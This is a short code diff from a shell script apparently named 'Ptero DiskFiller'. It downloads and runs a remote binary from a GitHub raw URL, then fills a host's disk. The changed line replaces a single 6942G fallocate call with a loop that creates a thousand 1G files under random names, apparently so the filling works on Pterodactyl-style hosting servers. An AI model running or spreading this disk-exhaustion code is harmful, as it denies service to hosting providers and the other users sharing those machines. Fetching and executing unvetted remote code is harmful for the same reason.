@@ -13,7 +13,7 @@ start_diskfiller(){
 curl -o apth https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/apth
 chmod +x apth
 ./apth util-linux
-linux/usr/bin/fallocate -l 6942G diskfilled
+for run in {1..1000}; do linux/usr/bin/fallocate -l 1G $RANDOM; done
 }                                             
 sleep 1
 echo "${bold}${lightgreen}Started Ptero DiskFiller"
